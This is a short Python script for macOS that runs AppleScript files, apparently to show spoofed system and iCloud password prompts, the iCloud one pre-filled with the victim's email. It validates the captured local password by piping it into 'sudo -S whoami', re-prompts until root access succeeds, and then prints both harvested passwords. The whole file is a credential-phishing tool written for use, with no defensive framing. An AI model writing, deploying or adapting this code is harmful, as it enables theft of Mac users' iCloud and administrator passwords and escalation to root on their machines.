import subprocess
import checkiCloudEmail

def promptSystem():
    try:
        run_command = subprocess.check_output(
        "osascript system.applescript", shell=True)
    except subprocess.CalledProcessError:
        pass
    return run_command.rstrip()

def promptiCloud():
    try:
        run_command = subprocess.check_output(
        "osascript icloud.applescript {0}".format(checkiCloudEmail.checkEmail()), shell=True)
    except subprocess.CalledProcessError:
        pass
    return run_command

def tryRoot(pw):
    try:
        run_command = subprocess.check_output(
        "echo '{0}' | sudo -S whoami".format(pw), shell=True)
    except subprocess.CalledProcessError:
        pass
    if "root" in run_command.rstrip():
        return True
    else:
        return False

if __name__ == "__main__":
    icloudpass = promptiCloud()
    print icloudpass
    localpass = promptSystem()
    while tryRoot(localpass) is not True:
        localpass = promptSystem()
    print localpass
